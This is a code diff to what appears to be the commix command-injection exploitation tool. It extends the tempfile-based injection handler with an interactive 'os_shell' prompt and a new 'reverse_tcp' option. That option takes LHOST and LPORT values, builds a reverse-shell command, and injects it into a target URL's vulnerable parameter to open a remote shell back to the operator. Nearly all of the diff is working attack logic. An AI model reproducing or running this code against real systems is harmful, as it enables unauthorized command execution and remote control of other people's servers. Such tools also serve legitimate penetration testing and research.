@@ -30,9 +30,10 @@ from src.utils import settings
 
 from src.thirdparty.colorama import Fore, Back, Style, init
 
-from src.core.injections.controller import checks
 from src.core.requests import headers
+from src.core.shells import reverse_tcp
 from src.core.requests import parameters
+from src.core.injections.controller import checks
 
 from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector
 from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads
@@ -322,6 +323,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
               try:    
                 # Pseudo-Terminal shell
                 go_back = False
+                go_back_again = False
                 while True:
                   # Delete previous shell (text) files (output) from /tmp
                   delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
@@ -329,31 +331,51 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                   	print ""
                   if go_back == True:
                     break
-                  gotshell = raw_input("(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
+                  gotshell = raw_input("(?) Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
                   if gotshell in settings.CHOISE_YES:
                     print ""
-                    print "Pseudo-Terminal (type '?' for shell options)"
+                    print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
                     while True:
                       try:
-                        cmd = raw_input("Shell > ")
+                        cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                         cmd = checks.escaped_cmd(cmd)
                         if cmd.lower() in settings.SHELL_OPTIONS:
-                          if cmd == "?":
-                            menu.shell_options()
-                            continue
-                          elif cmd.lower() == "quit":
+                          os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
+                          if os_shell_option == False:
+                            return False
+                          elif os_shell_option == "quit":  
                             # Delete previous shell (text) files (output) from /tmp
                             delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)                          
                             sys.exit(0)
-                          elif cmd.lower() == "back":
+                          elif os_shell_option == "back":
                             go_back = True
-                            if checks.next_attack_vector(technique, go_back) == True:
-                              break
-                            else:
-                              if no_result == True:
-                                return False 
-                              else:
-                                return True 
+                            break
+                          elif os_shell_option == "os_shell": 
+                              print Fore.YELLOW + "(^) Warning: You are already into an 'os_shell' mode." + Style.RESET_ALL + "\n"
+                          elif os_shell_option == "reverse_tcp":
+                            # Set up LHOST / LPORT for The reverse TCP connection.
+                            lhost, lport = reverse_tcp.configure_reverse_tcp()
+                            while True:
+                              if lhost and lport in settings.SHELL_OPTIONS:
+                                result = checks.check_reverse_tcp_options(lhost)
+                              else:  
+                                cmd = reverse_tcp.reverse_tcp_options(lhost, lport)
+                                result = checks.check_reverse_tcp_options(cmd)
+                              if result != None:
+                                if result == 0:
+                                  return False
+                                elif result == 1 or result == 2:
+                                  go_back_again = True
+                                  break
+                              # Command execution results.
+                              from src.core.injections.results_based.techniques.classic import cb_injector
+                              whitespace = settings.WHITESPACES[0]
+                              response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+                              # Evaluate injection results.
+                              shell = cb_injector.injection_results(response, TAG)
+                              if menu.options.verbose:
+                                print ""
+                              print Back.RED + "(x) Error: The reverse TCP connection has been failed!" + Style.RESET_ALL
                           else:
                             pass
                         else:
